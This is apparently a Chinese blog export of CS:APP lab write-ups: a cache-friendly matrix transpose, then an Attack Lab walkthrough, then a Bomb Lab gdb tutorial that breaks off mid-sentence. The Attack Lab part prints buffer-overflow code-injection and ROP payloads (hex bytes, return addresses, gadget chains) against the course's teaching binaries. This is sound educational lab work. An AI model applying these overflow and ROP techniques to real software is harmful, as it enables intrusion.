href="https://zhuanlan.zhihu.com/p/484657229">解答链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_64x64</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span><br>&#123;<br>    <span class="hljs-type">int</span> a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i += <span class="hljs-number">8</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j += <span class="hljs-number">8</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i; k &lt; i + <span class="hljs-number">4</span>; k++)&#123;<br>                <span class="hljs-comment">// 得到A的第1,2块</span><br>                <span class="hljs-comment">// 用了Cache A1号</span><br>                a_0 = A[k][j + <span class="hljs-number">0</span>];<br>                a_1 = A[k][j + <span class="hljs-number">1</span>];<br>                a_2 = A[k][j + <span class="hljs-number">2</span>];<br>                a_3 = A[k][j + <span class="hljs-number">3</span>];<br>                a_4 = A[k][j + <span class="hljs-number">4</span>];<br>                a_5 = A[k][j + <span class="hljs-number">5</span>];<br>                a_6 = A[k][j + <span class="hljs-number">6</span>];<br>                a_7 = A[k][j + <span class="hljs-number">7</span>];<br>                <span class="hljs-comment">// 复制给B的第1,2块</span><br>                <span class="hljs-comment">// 用了Cache B1 B2 B3 B4</span><br>                <span class="hljs-comment">// 正确的</span><br>                B[j + <span class="hljs-number">0</span>][k] = a_0;<br>                B[j + <span class="hljs-number">1</span>][k] = a_1;<br>                B[j + <span class="hljs-number">2</span>][k] = a_2;<br>                B[j + <span class="hljs-number">3</span>][k] = a_3;<br>                <br>                <span class="hljs-comment">// 暂存</span><br>B[j + <span class="hljs-number">0</span>][k + <span class="hljs-number">4</span>] = a_4;<br>                B[j + <span class="hljs-number">1</span>][k + <span class="hljs-number">4</span>] = a_5;<br>                B[j + <span class="hljs-number">2</span>][k + <span class="hljs-number">4</span>] = a_6;<br>                B[j + <span class="hljs-number">3</span>][k + <span class="hljs-number">4</span>] = a_7;<br>            &#125;<br>            <span class="hljs-comment">// Cache B1 B2 B3 B4 传输完成</span><br>            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = j; k &lt; j + <span class="hljs-number">4</span>; k++)&#123;<br>                <span class="hljs-comment">// 得到B的第2块</span><br>            <span class="hljs-comment">// 使用 B1</span><br>                a_0 = B[k][i + <span class="hljs-number">4</span>];<br>                a_1 = B[k][i + <span class="hljs-number">5</span>];<br>                a_2 = B[k][i + <span class="hljs-number">6</span>];<br>                a_3 = B[k][i + <span class="hljs-number">7</span>];<br>                <br>                <span class="hljs-comment">// 读入A5</span><br>                a_4 = A[i + <span class="hljs-number">4</span>][k];<br>                a_5 = A[i + <span class="hljs-number">5</span>][k];<br>                a_6 = A[i + <span class="hljs-number">6</span>][k];<br>                a_7 = A[i + <span class="hljs-number">7</span>][k];<br>                <br>                <span class="hljs-comment">// 复制给B的第2块</span><br>                B[k][i + <span class="hljs-number">4</span>] = a_4;<br>                B[k][i + <span class="hljs-number">5</span>] = a_5;<br>                B[k][i + <span class="hljs-number">6</span>] = a_6;<br>                B[k][i + <span class="hljs-number">7</span>] = a_7;<br>                <br>                <span class="hljs-comment">// B原来的第2块移动到第3块</span><br>                <span class="hljs-comment">// 同时覆盖B1</span><br>                B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">0</span>] = a_0;<br>                B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">1</span>] = a_1;<br>                B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">2</span>] = a_2;<br>                B[k + <span class="hljs-number">4</span>][i + <span class="hljs-number">3</span>] = a_3;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = i + <span class="hljs-number">4</span>; k &lt; i + <span class="hljs-number">8</span>; k++)<br>            &#123;<br>                <span class="hljs-comment">// 处理第4块</span><br>                a_4 = A[k][j + <span class="hljs-number">4</span>];<br>                a_5 = A[k][j + <span class="hljs-number">5</span>];<br>                a_6 = A[k][j + <span class="hljs-number">6</span>];<br>                a_7 = A[k][j + <span class="hljs-number">7</span>];<br>                B[j + <span class="hljs-number">4</span>][k] = a_4;<br>                B[j + <span class="hljs-number">5</span>][k] = a_5;<br>                B[j + <span class="hljs-number">6</span>][k] = a_6;<br>                B[j + <span class="hljs-number">7</span>][k] = a_7;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="小结">小结</h1><ol type="1"><li><p>代码习惯</p><ul><li><p>Part A没有建立数据结构，导致函数传参的复杂。</p></li><li><p>Part B设置了一些没必要的参数，以至于没意识到12个参数的意义在于可以复制一整列 /行。</p></li></ul></li><li><p>Cache替换</p><ul><li>两个数组起始所占的Cache行号是否相同</li><li>二位数组不同行之间的Cache行号是否相同</li><li>每读入一个Cache块，能够做到的最少被占用的次数。</li><li>具体到二维数组的转置，在知道Cache块大小和Cache行数的情况下，可以做针对性的优化。</li><li>因此一般而言，设置大小适中的block有一定概率能够提高程序运行的速度。</li><li>以块的整个周期来分析平均MISS的次数，以此推断整体的MISS。</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Attack Lab记录</title>
    <link href="/2023/02/19/attack/"/>
    <url>/2023/02/19/attack/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="缓冲区溢出">缓冲区溢出</h2><p>将栈指针作为输入，则若缓冲区溢出，整个栈帧都会受影响。而栈需要保存返回的断点，若栈帧相邻，则可以改变返回函数的断点，从而返回到我们指定的一个函数。针对溢出，有三种处理方式</p><ol type="1"><li>设置段寻址的，每次的值不同的canary值，通过gdb可以知道单次的值</li></ol><p><img src="/images/reg_canary.png" alt="金丝雀值" style="zoom:50%;"/></p><ol start="2" type="1"><li>每次的stack地址随机，不一定能跳装到字符串的地址运行。但全局变量和代码的位置不变。</li><li>设置栈区的值为不可执行代码</li></ol><p>ROPattack，借助已有的代码，和ret的特性，不断借助栈跳转代码以达到目的。</p><p><img src="/images/ROP_attack.png" alt="ROP方式" style="zoom:50%;"  /></p><h1 id="具体流程">具体流程</h1><h2 id="quick-start">Quick Start</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://csapp.cs.cmu.edu/3e/target1.tar<br>tar -xvf target1.tar <br></code></pre></td></tr></table></figure><p>结合汇编代码中16进制数代表的指令，通过hex2raw输入程序，可以注入自己想要让其运行的程序，达到攻击的效果。注意不能包含0x0a，代表。其中借助Codeinjection完成3个touch函数的调用，借助Return-orientedprogramming完成两个函数的调用。</p><h2 id="phase1">Phase1</h2><p><img src="/images/phase_1.png" alt="phase 1" style="zoom:50%;"/></p><p>先通过gdb判断汇编函数的入口在于stable_launch -&gt; launch -&gt;test</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">break</span> *<span class="hljs-built_in">test</span><br>run -q<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> 900 0000000000401968 &lt;test&gt;:<br> 901   401968:   48 83 ec 08             sub    $0x8,%rsp<br> 902   40196c:   b8 00 00 00 00          mov    $0x0,%eax<br> 903   401971:   e8 32 fe ff ff          callq  4017a8 &lt;getbuf&gt;<br> 904   401976:   89 c2                   mov    %eax,%edx<br> 905   401978:   be 88 31 40 00          mov    $0x403188,%esi<br> 906   40197d:   bf 01 00 00 00          mov    $0x1,%edi<br> 907   401982:   b8 00 00 00 00          mov    $0x0,%eax<br> 908   401987:   e8 64 f4 ff ff          callq  400df0 &lt;__printf_chk@plt&gt;<br> 909   40198c:   48 83 c4 08             add    $0x8,%rsp<br> 910   401990:   c3                      retq<br><br># getbuf栈的大小为40Byte<br>00000000004017a8 &lt;getbuf&gt;:<br> 778   4017a8:   48 83 ec 28             sub    $0x28,%rsp<br> 779   4017ac:   48 89 e7                mov    %rsp,%rdi <br> 780   4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;<br> 781   4017b4:   b8 01 00 00 00          mov    $0x1,%eax<br> 782   4017b9:   48 83 c4 28             add    $0x28,%rsp<br> 783   4017bd:   c3                      retq<br> 784   4017be:   90                      nop<br> 785   4017bf:   90                      nop<br><br></code></pre></td></tr></table></figure><p>结合writeup可知C语言的函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> val;<br>val = getbuf();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure><p>结合gdb判断跳转函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 对应返回函数的值</span><br>x <span class="hljs-variable">$rsp</span><br><span class="hljs-comment"># call getbuf前的rsp: 0x5561dca8 </span><br><span class="hljs-comment"># call 之后rsp: 0x5561dca0 可以看出留出了8byte</span><br><span class="hljs-comment"># x $rsp : 0x00401976 对应返回的断点</span><br><span class="hljs-comment"># sub 0x28 rsp:0x5561dc78 作为输入的函数 因此只需要把 0x5561dca0对应的值改成touch1的地址即可</span><br><span class="hljs-comment"># 40Byte的字符串 将最后8byte作为返回地址输入即可</span><br><span class="hljs-comment"># 00 00 00 00 00 40 17 c0 </span><br>./hex2raw &lt; phase_1.txt &gt; phase_1-raw.txt<br>./ctarget -q &lt; phase_1-raw.txt<br><span class="hljs-comment"># ? illlegal instruction </span><br><span class="hljs-comment"># 注意小端序存储 原以为8byte</span><br><span class="hljs-comment"># 似乎只要4byte</span><br>x <span class="hljs-variable">$rsp</span> 0x5561dca0:     0x00401976<br><span class="hljs-comment"># pass</span><br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>C0 17 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><h2 id="phase2">Phase2</h2><p><img src="/images/phase_2.png" alt="phase 2" style="zoom:50%;"/></p><p>在栈的位置执行代码，输入特定的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 需要注入cookies的参数 32bit<br>mov 0x59b997fa %edi <br><br># 参考这个代码<br>bf 01 00 00 00          mov    $0x1,%edi<br>bf fa 97 b9 59 <br><br># 根据提示，应该根据ret进行跳装 当前rsp的值就是返回的值 <br># ?不定长 5byte<br>bf fa 97 b9 59 # mov $0x59b997fa %edi  <br>c3  # retq<br>0x5561dc78 # pc1<br>0x4017ec # pc2<br>bf fa 97 b9 59 c3 FF FF<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>ec 17 40 00 00 00 00 00 <br></code></pre></td></tr></table></figure><h2 id="phase3">Phase3</h2><p><img src="/images/phase_3.png" alt="phase 3" style="zoom:50%;" /></p><p>edi为指针，使得值相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x5561dc78 # pc1<br>0x4018fa # pc2<br>0x59b997fa #cookie<br><br>bf 80 dc 61 55 c3 FF FF<br>35 39 62 39 39 37 66 61 <br>00 FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>fa 18 40 00 00 00 00 00<br><br><br># 似乎被覆盖了?<br># 需要在更前面<br>bf b0 dc 61 55 c3 FF FF<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>78 dc 61 55 00 00 00 00<br>fa 18 40 00 00 00 00 00<br>35 39 62 39 39 37 66 61 <br>00 FF FF FF FF FF FF FF<br><br># pass<br></code></pre></td></tr></table></figure><h2 id="phase4">phase4</h2><p>借助rop的gadget，源代码设计了gadget farm，便于操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d rtarget &gt; b.asm<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># :/retq 在vim寻找retq可以借助ret来跳转<br># :/48 c4 等操作码，观察可以使用的元素 结合指令表格确定需要的操作<br># 在最后一次ret之前需要完成设置参数并移动寄存器<br><br># 在start_farm和mid_farm之间，两个gadgets<br># 借助popq的特性传参 58 - 5f<br># 0x90 nop<br><br># farm<br>4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax<br>4019cf:   c3                      retq<br>4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax<br><br># gadget<br>4019cc:   58    popq %rax<br>4019cd:   90    nop<br>4019ce:   c3   ret<br> <br>4019a3:   89 c7   mov %eax, %edi <br>4019a5:   c3    ret<br><br># 根据上面的跳转设置值<br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>FF FF FF FF FF FF FF FF <br>cc 19 40 00 00 00 00 00 /* ret gadget 1 */<br>fa 97 b9 59 00 00 00 00 /* popq %rax */<br>a3 19 40 00 00 00 00 00 /* ret 4019a3 */<br>ec 17 40 00 00 00 00 00 /* ret touch2 */<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Bomb Lab记录</title>
    <link href="/2023/02/17/bomb/"/>
    <url>/2023/02/17/bomb/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="objdump">objdump</h2><p>objdump -d可将二进制文件转换为汇编代码（反汇编）</p><h2 id="gdb">GDB</h2><p>类似于图形界面的debugger，通过命令行执行。这里针对汇编进行debug。使用tui进行查看。</p><h3 id="基本流程">基本流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 确保debug with source code</span><br>gcc -g -ggdb csim.c -o csim.out<br><br><span class="hljs-comment"># 进入汇编调试</span><br><span class="hljs-comment"># layout split 可以同时看到源代码和汇编代码</span><br>layout asm<br><span class="hljs-comment"># refresh</span><br>ref<br><br><span class="hljs-comment"># 从第一个指令开始debug</span><br><span class="hljs-comment"># Entry point</span><br>starti<br><br><span class="hljs-comment"># 下断点进行debug(break *main也可以)</span><br><span class="hljs-built_in">break</span> *assmbly_address<br>next step <span class="hljs-comment"># 相对source code next跳过function</span><br>nexti stepi  <span class="hljs-comment"># 相对assembly code</span><br>c <span class="hljs-comment">#下一个断点</span><br>info <span class="hljs-built_in">break</span> <span class="hljs-comment"># 查看断点信息</span><br>delete <span class="hljs-built_in">id</span> <span class="hljs-comment"># 删除对应断点</span><br></code></pre></td></tr></table></figure><h3 id="查看修改信息">查看修改信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 寄存器</span><br>i reg reg_name<br>i all-registes<br><span class="hljs-comment"># 16进制 /xs</span><br>p/x <span class="hljs-variable">$esi</span><br><span class="hljs-comment"># 连续展示40byte 40c就是char</span><br>x/40b memory_address<br><span class="hljs-comment"># 修改信息</span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$rdi</span> = 0x402400<br><span class="hljs-comment"># 设置特定地址的值</span><br><span class="hljs-built_in">set</span> *0x20001234 = 0xABABABAB<br></code></pre></td></tr></table></figure><h2 id="程序运行">程序运行</h2><h3 id="寄存器设置">寄存器设置</h3><p>%r/eax 为返回值 %r/ebx 被调用者保存 %r/edi r/esi r/edx r/ecx4对应第四个-第一个参数 %r/ebp 栈尾 %r/esp 栈顶部</p><h3 id="调用函数">调用函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"># 如果需要用到栈<br># 存ebp<br>pushl %ebp<br># 新的ebp<br>movl %esp, %ebp<br>    <br>movl %ebp,%esp<br>popl %ebp b  <br><br># 注意隐含的PC<br><span class="hljs-meta"># parameter </span><br># PC<br># EBP<span class="hljs-number">&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># call Main，函数运行的第一个指令实际并不是Main，而是Entry point，gdb starti / info file可以得知。<br># libc initializations, heap allocation, 由编译器确定<br># y86也存在一个INIT函数<br>movl Stack, %esp<br>call Main<br>halt<br><br>Main: <br># pushl后指针指向的是栈顶元素，而不是空元素。因此不能直接mov到esp。<br><br># 如果函数需要用到栈时<br># 存ebp<br>pushl %ebp<br># 新的ebp<br>movl %esp, %ebp<br><br># 传参可以借助edi，也可以借助栈。<br>call Add <br><br><br>movl %ebp,%esp<br>popl %ebp<br><br># ebp存储的是PC的值<br>ret<br>Add:<br>pushl %ebp<br>movl %esp, %ebp<br><br># ！Call函数和ret函数隐含有push，pop PC，且在函数开始时一般都要push ebp，保存被调用者的栈起始指针，因此从在64bit系统中，8(ebp) 代表传的第一个参数。<br>movl 8(%ebp),%ecx<br><br>movl %ebp,%esp<br>popl %ebp<br><br><br></code></pre></td></tr></table></figure><h3 id="汇编指令">汇编指令</h3><p>主要基于x86指令集架构，也可以不分析，小数据可以借助gdb调试判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 比较<br>CMPL # unsign <br>CMP  # a - b<br>TEST eax, eax # 若eax = 0, ZF = 1<br><br># 跳转<br>JA # above unsigned CF = 0 and ZF = 0 <br>JG # greater<br><br># 赋值<br>movzbl # zero extend byte to long 0 拓展<br># AT&amp;T in this syntax, the source comes first and the destination second. <br># 括号代表访存 多用于取地址操作，当MOV为将对应内存地址的数值赋值时，该操作数表示只计算地址。<br>lea 0x50(%rsp), %rsi # 只计算具体的地址<br># 常用于存储指针。<br><br># 按位异或，相同等价于清零<br>xorl    %eax, %eax<br></code></pre></td></tr></table></figure><h3 id="数据结构">数据结构</h3><p>在处理输入时，若不做限制，可能导致栈溢出，无法return的情况。因为接受输入的栈指针对应栈帧的大小有限。因此为了防止栈溢出覆写数据，跳转到攻击代码的情况，会出现%fs:40，采用段寻址的只读代码，又名为金丝雀值，使用系统随机生成，与栈相应位置进行对比，判断是否相同。</p><h1 id="具体过程">具体过程</h1><h2 id="quick-start">Quick Start</h2><p><ahref="http://csapp.cs.cmu.edu/3e/labs.html">进入网站</a>，下载write_up.pdf，并在可运行环境下下载文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># wsl ubuntu18.04 x86_64 </span><br>wget http://csapp.cs.cmu.edu/3e/bomb.tar<br>tar -xvf bomb.tar <br></code></pre></td></tr></table></figure><p>从bomb.c可知需要输入六句话。只能通过反汇编得到要输入的文件。由write_up的hints可知需要使用到gdb与objdump。有两个方向，通过objdump-d直接分析汇编代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">objdump -d bomb &gt; a.asm <br>vim a.asm <br><span class="hljs-comment"># 可对照分析 crtl + w + z 对换;crtl + z 后 fg 保留状态 :vnew bomb.c</span><br></code></pre></td></tr></table></figure><h2 id="bomb1">bomb1</h2><p>先分析汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># main<br>callq  40149e &lt;read_line&gt;<br># 传入第一个参数<br>mov    %rax,%rdi<br># 这里set $rdi = 0x402400 可以直接defuse, 也可以看出，核心在于使得这里的rax变成0x402400...其实是地址,这里以为是数值...<br>callq  400ee0 &lt;phase_1&gt;<br><br># phase_1<br># 留出8Byte<br>sub    $0x8,%rsp<br># ！第二个参数 代表string<br>mov    $0x402400,%esi<br>callq  0x401338 &lt;strings_not_equal&gt;                                     <br># If %eax为0, 则会跳转 即代表false<br>test   %eax,%eax <br>je     0x400ef7 &lt;phase_1+23&gt;<br>callq  0x40143a &lt;explode_bomb&gt;  <br></code></pre></td></tr></table></figure><p>可以得到与rdi比较的16进制表示为0x402400，因此需要输入read_line(string)= 0x402400。先通过gdb观察，输入123，输出的0x603780，而1的ascii码为490x31，似乎没有明显联系。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># read_lines<br>sub    $0x8,%rsp<br>mov    $0x0,%eax<br>callq  0x4013f9 &lt;skip&gt;<br># gdb发现这一步输入就已经是0x603780了 且不管输入什么都是0x603780<br>test   %rax,%rax<br>jne    0x40151f &lt;read_line+129&gt;                                         <br></code></pre></td></tr></table></figure><p>输入1231和abc查看所有的寄存器的区别，发现只有rcx、rbp有不同，似乎是长度，莫非入栈了?看来需要阅读skip的源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x40141c &lt;skip+35&gt;      callq  0x400b80 &lt;fgets@plt&gt;<br></code></pre></td></tr></table></figure><p>于是问题转换到fgets的数据存在了哪里。原来0x603780指的不是数据，而是内存的地址...</p><p>0x603780 0a|33|32|31 按字节编址 'a' 31 'b' 32 'c' 33 a '' 0'0'，从右往左显示...！体现了小端序，这里为了显示数字转置了。</p><p>0x603781 00|0a|33|32 0x603782 00|00|0a|33</p><p>所以只需要在比较之前设个断点，看0x402400对应的内存数组就可以了。x/60s 0x402400。得到结果。Border relations with Canada have never 